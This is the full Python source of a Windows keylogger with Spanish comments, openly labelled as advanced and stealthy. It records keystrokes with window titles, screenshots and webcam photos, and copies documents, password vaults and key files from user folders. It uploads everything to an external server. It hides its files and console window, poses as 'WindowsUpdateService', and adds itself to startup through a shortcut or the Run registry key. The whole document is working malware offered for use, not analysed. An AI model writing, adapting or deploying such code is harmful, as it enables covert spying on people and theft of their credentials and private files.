"""
KEYLOGGER AVANZADO CON MODO PRUEBA Y SIGILO
Versión: 6.0

Mejoras:
- Con captura de cámara mejorada
"""

import os
import time
import requests
from pynput import keyboard
import threading
from threading import Timer
import pyautogui
import sys
import logging
from datetime import datetime
import ctypes
import traceback
import shutil
import winreg
import hashlib
import socket
import win32gui
import cv2  # Para captura de cámara

# ================= CONFIGURACIÓN =================
TEST_MODE = False  # True = Modo prueba visible, False = Modo sigiloso
ENABLE_STEALTH = False  # Activado automáticamente en producción
ENABLE_STARTUP = False  # Persistencia automática en producción
ENABLE_SELF_COPY = False  # Auto-copiar el ejecutable
ENABLE_FILE_EXTRACTION = True  # Extracción de archivos sensibles
ENABLE_CAMERA_CAPTURE = True  # Habilitar captura de cámara

# Configuración del servidor
SERVER_BASE_URL = "http://key.michu.site:2727"
SCREENSHOT_INTERVAL = 15  # Segundos entre capturas
UPLOAD_INTERVAL = 300  # Segundos entre envíos (5 minutos)
FILE_EXTRACTION_INTERVAL = 86400  # 24 horas (extracción diaria)
CAMERA_CAPTURE_INTERVAL = 10  # Segundos entre capturas de cámara
CAMERA_UPLOAD_INTERVAL = 120  # Segundos entre envíos de fotos (2 minutos)
MAX_RETRIES = 3  # Intentos de envío
RETRY_DELAY = 30  # Segundos entre reintentos

# Extensiones y directorios para extracción de archivos
SENSITIVE_EXTENSIONS = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', 
                         '.jpg', '.jpeg', '.png', '.pptx', '.accdb', '.db', 
                         '.sqlite', '.kdbx', '.ovpn', '.pem']
SENSITIVE_DIRECTORIES = [
    os.path.join(os.environ['USERPROFILE'], 'Desktop'),
    os.path.join(os.environ['USERPROFILE'], 'Documents'),
    os.path.join(os.environ['USERPROFILE'], 'Downloads'),
    os.path.join(os.environ['USERPROFILE'], 'Pictures')
]

# Nombres fijos
TEST_SERVICE_NAME = "KeyloggerTest"
PROD_SERVICE_NAME = "WindowsUpdateService"

# Seleccionar nombre según modo
SERVICE_NAME = TEST_SERVICE_NAME if TEST_MODE else PROD_SERVICE_NAME
MUTEX_NAME = f"Global\\{SERVICE_NAME}Mutex"

# Rutas de almacenamiento
if TEST_MODE:
    BASE_PATH = os.path.join(os.path.expanduser('~'), 'Desktop', 'KeyloggerData')
else:
    BASE_PATH = os.path.join(os.getenv('LOCALAPPDATA', 'C:\\'), SERVICE_NAME, 'Cache')

TEMP_PATH = BASE_PATH
SCREENSHOT_DIR = os.path.join(BASE_PATH, 'screenshots')
LOG_DIR = os.path.join(BASE_PATH, 'logs')
EXTRACTED_FILES_DIR = os.path.join(BASE_PATH, 'extracted_files')
CAMERA_DIR = os.path.join(BASE_PATH, 'camera')  # Carpeta para fotos de cámara
DEBUG_LOG = os.path.join(BASE_PATH, 'debug.log')
CRASH_LOG = os.path.join(BASE_PATH, 'crash.log')

# Variables globales
current_log_file = None
shift_pressed = False
caps_lock_on = False
num_lock_on = True
is_running = True
copy_created = False  # Control de autocopia única
dead_key = None  # Almacena la última tecla muerta (acento)
last_window = None  # Última ventana registrada

# ================= FUNCIÓN CAPTURA VENTANA ACTIVA =================
def get_active_window():
    """Obtiene el título de la ventana activa con formato limpio"""
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window).strip()
        return title if title else "Sin_Título"
    except Exception:
        return "Desconocida"

# ================= FUNCIÓN PARA PREVENIR MÚLTIPLES INSTANCIAS =================
def prevent_multiple_instances():
    """Evita múltiples ejecuciones usando un mutex"""
    if not TEST_MODE:
        try:
            mutex = ctypes.windll.kernel32.CreateMutexW(None, True, MUTEX_NAME)
            return ctypes.windll.kernel32.GetLastError() != 183
        except Exception:
            return True
    return True  # En modo prueba permitimos múltiples instancias

# ================= FUNCIONES DE AUTO-COPIADO =================
def calculate_file_hash(file_path):
    """Calcula el hash SHA-256 de un archivo"""
    sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            while True:
                data = f.read(65536)
                if not data:
                    break
                sha256.update(data)
        return sha256.hexdigest()
    except Exception:
        return None

def self_copy():
    """Copia el ejecutable manteniendo nombre y formato original"""
    global copy_created
    
    if not ENABLE_SELF_COPY or copy_created:
        return False, None
        
    try:
        # Obtener información del ejecutable actual
        current_exe = sys.argv[0]
        exe_name = os.path.basename(current_exe)
        copy_path = os.path.join(BASE_PATH, exe_name)
        
        # Crear directorio base si no existe
        os.makedirs(BASE_PATH, exist_ok=True)
        
        # Verificar si ya existe una copia idéntica
        if os.path.exists(copy_path):
            original_hash = calculate_file_hash(current_exe)
            copy_hash = calculate_file_hash(copy_path)
            if copy_hash == original_hash:
                copy_created = True
                return True, copy_path
        
        # Hacer la copia
        shutil.copy2(current_exe, copy_path)
        copy_created = True
        
        # Ocultar en producción
        if not TEST_MODE and sys.platform == 'win32':
            hide_file(copy_path)
            
        if TEST_MODE:
            print(f"Auto-copia creada: {copy_path}")
        
        return True, copy_path
    except Exception as e:
        if TEST_MODE:
            print(f"Error en auto-copia: {str(e)}")
        return False, None

# ================= FUNCIONES DE OCULTACIÓN =================
def hide_file(path):
    """Oculta un archivo/directorio de forma permanente"""
    if not TEST_MODE and sys.platform == 'win32':
        try:
            # Atributos: oculto + sistema (no visible incluso con "mostrar ocultos")
            ctypes.windll.kernel32.SetFileAttributesW(path, 2 | 4)
        except Exception:
            pass

def hide_window():
    """Oculta la ventana en modo producción"""
    if not TEST_MODE:
        try:
            if sys.platform == 'win32':
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                if console_window:
                    ctypes.windll.user32.ShowWindow(console_window, 0)
        except Exception:
            pass

def setup_directories():
    """Crea directorios con ocultación máxima"""
    try:
        # Crear directorios necesarios
        directories = [BASE_PATH, SCREENSHOT_DIR, LOG_DIR, EXTRACTED_FILES_DIR, CAMERA_DIR]
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
            hide_file(directory)
        
        return True
    except Exception as e:
        if TEST_MODE:
            print(f"Error creando directorios: {str(e)}")
        return False

# ================= CAPTURA DE TECLADO MEJORADA =================
def update_modifier_state(key, is_press):
    global shift_pressed, caps_lock_on, num_lock_on
    try:
        if key in (keyboard.Key.shift, keyboard.Key.shift_r):
            shift_pressed = is_press
        elif key == keyboard.Key.caps_lock and is_press:
            caps_lock_on = not caps_lock_on
        elif key == keyboard.Key.num_lock and is_press:
            num_lock_on = not num_lock_on
    except Exception:
        pass

def should_capitalize():
    return (shift_pressed and not caps_lock_on) or (not shift_pressed and caps_lock_on)

def combine_dead_key_with_vowel(dead_key_char, vowel_char):
    """Combina teclas muertas (acentos) con vocales para producir caracteres especiales"""
    dead_key_mappings = {
        '´': {'a': 'á', 'e': 'é', 'i': 'í', 'o': 'ó', 'u': 'ú', 
              'A': 'Á', 'E': 'É', 'I': 'Í', 'O': 'Ó', 'U': 'Ú'},
        '`': {'a': 'à', 'e': 'è', 'i': 'ì', 'o': 'ò', 'u': 'ù',
              'A': 'À', 'E': 'È', 'I': 'Ì', 'O': 'Ò', 'U': 'Ù'},
        '¨': {'a': 'ä', 'e': 'ë', 'i': 'ï', 'o': 'ö', 'u': 'ü',
              'A': 'Ä', 'E': 'Ë', 'I': 'Ï', 'O': 'Ö', 'U': 'Ü'},
        '^': {'a': 'â', 'e': 'ê', 'i': 'î', 'o': 'ô', 'u': 'û',
              'A': 'Â', 'E': 'Ê', 'I': 'Î', 'O': 'Ô', 'U': 'Û'},
        '~': {'a': 'ã', 'o': 'õ', 'n': 'ñ',
              'A': 'Ã', 'O': 'Õ', 'N': 'Ñ'}
    }
    
    # Buscar combinación válida
    if dead_key_char in dead_key_mappings:
        mapping = dead_key_mappings[dead_key_char]
        if vowel_char in mapping:
            return mapping[vowel_char]
    
    # Si no hay combinación válida, devolver la vocal original
    return vowel_char

def format_key(key):
    global dead_key
    
    # Mapeo completo de teclas especiales
    special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.backspace: "[⌫]",
        keyboard.Key.tab: "[↹]",
        keyboard.Key.esc: "[⎋]",
        keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]", 
        keyboard.Key.f3: "[F3]", keyboard.Key.f4: "[F4]", 
        keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]", 
        keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]", 
        keyboard.Key.f9: "[F9]", keyboard.Key.f10: "[F10]", 
        keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]", 
        keyboard.Key.insert: "[INSERT]", keyboard.Key.delete: "[DEL]",
        keyboard.Key.home: "[HOME]", keyboard.Key.end: "[END]",
        keyboard.Key.page_up: "[PGUP]", keyboard.Key.page_down: "[PGDN]",
        keyboard.Key.up: "[↑]", keyboard.Key.down: "[↓]",
        keyboard.Key.left: "[←]", keyboard.Key.right: "[→]",
        keyboard.Key.print_screen: "[PRTSC]",
        keyboard.Key.scroll_lock: "[SCRLK]",
        keyboard.Key.pause: "[PAUSE]",
        keyboard.Key.menu: "[MENU]",
        keyboard.Key.ctrl_l: "[CTRL]", keyboard.Key.ctrl_r: "[CTRL]",
        keyboard.Key.alt_l: "[ALT]", keyboard.Key.alt_r: "[ALT]",
        keyboard.Key.cmd: "[WIN]", keyboard.Key.cmd_r: "[WIN]",
    }
    
    keypad_map = {
        96: lambda: '0' if num_lock_on else '[INSERT]',
        97: lambda: '1' if num_lock_on else '[END]',
        98: lambda: '2' if num_lock_on else '[↓]',
        99: lambda: '3' if num_lock_on else '[PGDN]',
        100: lambda: '4' if num_lock_on else '[←]',
        101: lambda: '5' if num_lock_on else '',
        102: lambda: '6' if num_lock_on else '[→]',
        103: lambda: '7' if num_lock_on else '[HOME]',
        104: lambda: '8' if num_lock_on else '[↑]',
        105: lambda: '9' if num_lock_on else '[PGUP]',
        110: lambda: '.' if num_lock_on else '[DEL]',
        111: lambda: '/',
        106: lambda: '*',
        107: lambda: '+',
        109: lambda: '-',
    }
    
    # Ignorar modificadores solos
    if key in (keyboard.Key.shift, keyboard.Key.shift_r, 
               keyboard.Key.caps_lock, keyboard.Key.num_lock,
               keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
               keyboard.Key.alt_l, keyboard.Key.alt_r):
        return ""
    
    # Manejar teclado numérico
    if hasattr(key, 'vk') and key.vk in keypad_map:
        return keypad_map[key.vk]()
    
    # Manejar teclas especiales
    if key in special_keys:
        return special_keys[key]
    
    # Manejar caracteres normales
    if hasattr(key, 'char') and key.char:
        char = key.char
        
        # Manejar teclas muertas (acentos, diéresis)
        dead_key_chars = ['´', '`', '¨', '^', '~']
        
        if char in dead_key_chars:
            dead_key = char
            return ""  # No mostrar el acento solo
            
        elif dead_key:
            # Combinar tecla muerta con vocal
            combined = combine_dead_key_with_vowel(dead_key, char)
            dead_key = None  # Resetear después de usar
            
            # Aplicar mayúsculas si es necesario
            return combined.upper() if should_capitalize() else combined.lower()
        
        else:
            # Caracteres normales
            return char.upper() if should_capitalize() else char.lower()
    
    # Manejar teclas desconocidas
    return f"[{str(key).replace('Key.', '').upper()}]"

def on_press(key):
    global current_log_file, last_window
    
    try:
        update_modifier_state(key, True)
        key_str = format_key(key)
        
        # Solo procesar si es una tecla escribible
        if current_log_file and key_str:
            current_window = get_active_window()
            
            # Registrar ventana solo si cambió y es una tecla válida
            if current_window != last_window:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                window_info = f"\n[Ventana: {current_window} - {timestamp}]\n"
                
                with open(current_log_file, 'a', encoding='utf-8') as f:
                    f.write(window_info)
                    if TEST_MODE:
                        print(window_info, end='')
                
                last_window = current_window
            
            # Registrar la tecla normalmente
            with open(current_log_file, 'a', encoding='utf-8') as f:
                f.write(key_str)
                if TEST_MODE:
                    print(key_str, end='', flush=True)
                    
    except Exception as e:
        if TEST_MODE:
            print(f"Error en on_press: {str(e)}")

def on_release(key):
    try:
        update_modifier_state(key, False)
    except Exception:
        pass

# ================= CAPTURA DE PANTALLA =================
def capture_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        file_path = os.path.join(SCREENSHOT_DIR, filename)
        pyautogui.screenshot(file_path)
        hide_file(file_path)  # Ocultar captura
        
        if TEST_MODE:
            print(f"\nCaptura guardada: {file_path}")
            
        return True
    except Exception:
        return False

# ================= EXTRACCIÓN DE ARCHIVOS SENSIBLES =================
def extract_sensitive_files():
    """Busca y copia archivos sensibles a una carpeta temporal"""
    if not ENABLE_FILE_EXTRACTION or TEST_MODE:
        return []
    
    try:
        os.makedirs(EXTRACTED_FILES_DIR, exist_ok=True)
        hide_file(EXTRACTED_FILES_DIR)
    except Exception:
        return []
    
    extracted_files = []
    for directory in SENSITIVE_DIRECTORIES:
        if not os.path.isdir(directory):
            continue
            
        for root, _, files in os.walk(directory):
            for file in files:
                if any(file.lower().endswith(ext) for ext in SENSITIVE_EXTENSIONS):
                    src_path = os.path.join(root, file)
                    dest_path = os.path.join(EXTRACTED_FILES_DIR, file)
                    
                    # Evitar sobreescribir archivos
                    counter = 1
                    while os.path.exists(dest_path):
                        name, ext = os.path.splitext(file)
                        dest_path = os.path.join(EXTRACTED_FILES_DIR, f"{name}_{counter}{ext}")
                        counter += 1
                    
                    try:
                        shutil.copy2(src_path, dest_path)
                        hide_file(dest_path)
                        extracted_files.append(dest_path)
                    except Exception:
                        pass
    
    return extracted_files

# ================= ENVÍO DE DATOS =================
def check_internet_connection():
    """Verifica si hay conexión a internet"""
    try:
        # Intentar conectar a un servicio confiable
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        pass
    
    # Segundo método de verificación
    try:
        # Intentar resolver un dominio
        socket.getaddrinfo("google.com", None)
        return True
    except socket.gaierror:
        return False

def send_with_retry(endpoint, files):
    """Intenta enviar datos con reintentos y verificación de conexión"""
    for attempt in range(MAX_RETRIES):
        if not check_internet_connection():
            if TEST_MODE:
                print(f"Sin conexión a internet. Reintento {attempt+1}/{MAX_RETRIES}")
            time.sleep(RETRY_DELAY)
            continue
            
        try:
            response = requests.post(
                f"{SERVER_BASE_URL}/{endpoint}",
                files=files,
                timeout=30
            )
            if response.status_code == 200:
                return True
            elif TEST_MODE:
                print(f"Error en el servidor: {response.status_code}")
        except Exception as e:
            if TEST_MODE:
                print(f"Error en el envío: {str(e)}")
        
        time.sleep(RETRY_DELAY)
    
    return False

def upload_files(directory, endpoint, pattern):
    """Envía archivos acumulados cuando hay conexión"""
    try:
        files_to_send = []
        for filename in os.listdir(directory):
            if pattern(filename) and (current_log_file is None or filename != os.path.basename(current_log_file)):
                file_path = os.path.join(directory, filename)
                files_to_send.append((filename, file_path))
        
        # Lista para mantener registro de archivos enviados exitosamente
        uploaded_files = []
        
        for filename, file_path in files_to_send:
            try:
                # Leer contenido y cerrar archivo
                with open(file_path, 'rb') as f:
                    file_content = f.read()
                
                # Crear un archivo temporal en memoria para el envío
                files = {'file': (filename, file_content)}
                
                if send_with_retry(endpoint, files):
                    uploaded_files.append(file_path)
                    if TEST_MODE:
                        print(f"Archivo enviado: {filename}")
                        
            except Exception as e:
                if TEST_MODE:
                    print(f"Error procesando {filename}: {str(e)}")
        
        # Eliminar archivos después de enviarlos todos
        for file_path in uploaded_files:
            try:
                os.remove(file_path)
                if TEST_MODE:
                    print(f"Archivo eliminado: {os.path.basename(file_path)}")
            except Exception as e:
                if TEST_MODE:
                    print(f"Error eliminando archivo: {str(e)}")
        
        return True
    except Exception as e:
        if TEST_MODE:
            print(f"Error en upload_files: {str(e)}")
        return False

def upload_screenshots():
    return upload_files(
        SCREENSHOT_DIR,
        "upload/screenshots",
        lambda f: f.startswith("screenshot_") and f.endswith(".png")
    )

def upload_logs():
    return upload_files(
        LOG_DIR,
        "upload/logs",
        lambda f: f.startswith("keylog_") and f.endswith(".txt")
    )

def upload_extracted_files():
    """Envía archivos extraídos al servidor"""
    return upload_files(
        EXTRACTED_FILES_DIR,
        "upload/files",  # Nueva ruta en el servidor
        lambda f: any(f.lower().endswith(ext) for ext in SENSITIVE_EXTENSIONS)
    )

# ================= CAPTURA DE CÁMARA MEJORADA =================
def capture_camera_image():
    """Captura una imagen de la cámara y la guarda localmente"""
    if not ENABLE_CAMERA_CAPTURE:
        return None
        
    try:
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            return None
            
        ret, frame = camera.read()
        camera.release()
        
        if not ret:
            return None
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"camera_{timestamp}.jpg"
        file_path = os.path.join(CAMERA_DIR, filename)
        cv2.imwrite(file_path, frame)
        
        # Ocultar con máxima prioridad
        hide_file(file_path)
        
        if TEST_MODE:
            print(f"Captura de cámara guardada: {file_path}")
            
        return file_path
    except Exception as e:
        if TEST_MODE:
            print(f"Error captura cámara: {str(e)}")
        return None

def upload_camera_images():
    """Envía todas las imágenes acumuladas al servidor"""
    if not ENABLE_CAMERA_CAPTURE:
        return False
        
    try:
        # Obtener todas las imágenes de cámara pendientes
        camera_files = []
        for filename in os.listdir(CAMERA_DIR):
            if filename.startswith("camera_") and filename.endswith(".jpg"):
                file_path = os.path.join(CAMERA_DIR, filename)
                camera_files.append(file_path)
        
        if not camera_files:
            return True
            
        if TEST_MODE:
            print(f"Preparando envío de {len(camera_files)} fotos de cámara...")
        
        # Enviar todas las fotos en una sola solicitud
        files = {}
        for i, file_path in enumerate(camera_files):
            files[f'file_{i}'] = (os.path.basename(file_path), open(file_path, 'rb'))
        
        # Realizar el envío con reintentos
        success = send_with_retry("upload/camera", files)
        
        # Cerrar todos los archivos
        for f in files.values():
            f[1].close()
        
        # Eliminar solo si el envío fue exitoso
        if success:
            for file_path in camera_files:
                try:
                    os.remove(file_path)
                    if TEST_MODE:
                        print(f"Foto eliminada: {os.path.basename(file_path)}")
                except Exception:
                    pass
            return True
        
        return False
    except Exception as e:
        if TEST_MODE:
            print(f"Error enviando fotos: {str(e)}")
        return False

def scheduled_camera_capture():
    """Tarea programada para captura de cámara"""
    if is_running and ENABLE_CAMERA_CAPTURE:
        try:
            capture_camera_image()
        except Exception:
            pass
        finally:
            Timer(CAMERA_CAPTURE_INTERVAL, scheduled_camera_capture).start()

def scheduled_camera_upload():
    """Tarea programada para envío de fotos acumuladas"""
    if is_running and ENABLE_CAMERA_CAPTURE:
        try:
            if check_internet_connection():
                upload_camera_images()
        except Exception:
            pass
        finally:
            Timer(CAMERA_UPLOAD_INTERVAL, scheduled_camera_upload).start()

# ================= PERSISTENCIA =================
def add_to_startup(copy_path):
    """Añade la autocopia al inicio de Windows"""
    if not ENABLE_STARTUP or TEST_MODE or not copy_path:
        return False
        
    try:
        # Usar la copia creada para la persistencia
        exe_name = os.path.basename(copy_path)
        
        # Crear acceso directo en la carpeta de inicio
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        os.makedirs(startup_path, exist_ok=True)
        shortcut_path = os.path.join(startup_path, f"{SERVICE_NAME}.lnk")
        
        # Crear acceso directo
        from win32com.client import Dispatch
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = copy_path
        shortcut.WorkingDirectory = os.path.dirname(copy_path)
        shortcut.save()
        
        hide_file(shortcut_path)  # Ocultar acceso directo
        
        return True
    except Exception:
        # Método alternativo usando registro
        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, SERVICE_NAME, 0, winreg.REG_SZ, copy_path)
            return True
        except Exception:
            return False

# ================= TAREAS PROGRAMADAS =================
def scheduled_screenshot():
    if is_running:
        try:
            capture_screenshot()
        except Exception:
            pass
        finally:
            Timer(SCREENSHOT_INTERVAL, scheduled_screenshot).start()

def scheduled_upload():
    if is_running:
        try:
            if check_internet_connection():
                if TEST_MODE:
                    print("\nIniciando envío de datos...")
                upload_screenshots()
                upload_logs()
        except Exception:
            pass
        finally:
            Timer(UPLOAD_INTERVAL, scheduled_upload).start()

def scheduled_file_extraction():
    """Tarea programada para extracción y envío de archivos"""
    if is_running:
        try:
            if ENABLE_FILE_EXTRACTION and not TEST_MODE:
                # Extraer archivos sensibles
                extracted = extract_sensitive_files()
                if extracted and check_internet_connection():
                    # Subir archivos extraídos (ESTA FUNCIÓN SE ENCARGA DE LA ELIMINACIÓN)
                    upload_extracted_files()
        except Exception:
            pass
        finally:
            # Programar próxima extracción en 24 horas
            Timer(FILE_EXTRACTION_INTERVAL, scheduled_file_extraction).start()

# ================= FUNCIÓN PRINCIPAL =================
def main():
    global current_log_file, is_running, ENABLE_STEALTH, last_window
    
    # Configuración inicial mejorada
    if not TEST_MODE:
        ENABLE_STEALTH = True  # Forzar sigilo en producción
    
    hide_window()
    
    # Verificar instancias múltiples
    if not prevent_multiple_instances():
        if TEST_MODE:
            print("Ya hay una instancia en ejecución. Saliendo.")
        sys.exit(0)
    
    if not setup_directories():
        if TEST_MODE:
            print("Error creando directorios. Saliendo.")
        sys.exit(1)
    
    # Crear auto-copia del ejecutable
    copy_success, copy_path = False, None
    if ENABLE_SELF_COPY:
        copy_success, copy_path = self_copy()
    
    # Configurar logging
    logging.basicConfig(
        filename=DEBUG_LOG if not TEST_MODE else None,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    if TEST_MODE:
        print(f"=== MODO PRUEBA ACTIVADO ===")
        print(f"Nombre del Servicio: {SERVICE_NAME}")
        print(f"Base Path: {BASE_PATH}")
        print(f"ScreenShots: {SCREENSHOT_DIR}")
        print(f"Logs: {LOG_DIR}")
        print(f"Extracted Files: {EXTRACTED_FILES_DIR}")
        print(f"Camera: {CAMERA_DIR}")
        print(f"Servidor: {SERVER_BASE_URL}")
        print(f"Capturas cada: {SCREENSHOT_INTERVAL}s, Envíos cada: {UPLOAD_INTERVAL}s")
        print(f"Extracción de archivos cada: {FILE_EXTRACTION_INTERVAL}s")
        print(f"Capturas de cámara cada: {CAMERA_CAPTURE_INTERVAL}s")
        print(f"Envíos de cámara cada: {CAMERA_UPLOAD_INTERVAL}s")
        if copy_success:
            print(f"Auto-copia creada: {copy_path}")
        print("=============================")
    
    # Añadir persistencia usando la autocopia
    if copy_path and ENABLE_STARTUP and add_to_startup(copy_path):
        if TEST_MODE:
            print(f"Persistencia añadida al inicio usando: {copy_path}")
    
    # Iniciar archivo de registro con fecha/hora
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    current_log_file = os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
    with open(current_log_file, 'w', encoding='utf-8') as f:
        f.write(f"=== SESIÓN INICIADA: {datetime.now()} ===\n\n")
    hide_file(current_log_file)  # Ocultar archivo de registro
    
    # Inicializar con la ventana actual
    last_window = get_active_window()
    
    if TEST_MODE:
        print(f"Registro de teclas iniciado: {current_log_file}")
        print("Escribe algo... (Ctrl+C para detener)")
    
    # Iniciar captura de teclado
    keyboard_listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    keyboard_listener.daemon = True
    keyboard_listener.start()
    
    # Iniciar tareas programadas
    scheduled_screenshot()
    scheduled_upload()
    if ENABLE_FILE_EXTRACTION:
        scheduled_file_extraction()
    
    # Iniciar captura y envío de cámara
    if ENABLE_CAMERA_CAPTURE:
        scheduled_camera_capture()
        scheduled_camera_upload()
    
    if TEST_MODE:
        print("Keylogger iniciado correctamente")
    
    # Mantener el programa en ejecución
    while is_running:
        time.sleep(60)

# ================= MANEJO DE CRASH =================
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        is_running = False
        if TEST_MODE:
            print("\nKeylogger detenido manualmente")
        sys.exit(0)
    except Exception as e:
        try:
            # Guardar crash log con ocultación
            os.makedirs(BASE_PATH, exist_ok=True)
            with open(CRASH_LOG, 'a') as f:
                f.write(f"{datetime.now()}: {str(e)}\n")
                f.write(traceback.format_exc())
            hide_file(CRASH_LOG)
        except Exception:
            pass
            
        if TEST_MODE:
            print(f"Error crítico: {str(e)}")
            traceback.print_exc()
            print(f"Detalles en: {CRASH_LOG}")
        
        time.sleep(5)
        sys.exit(1)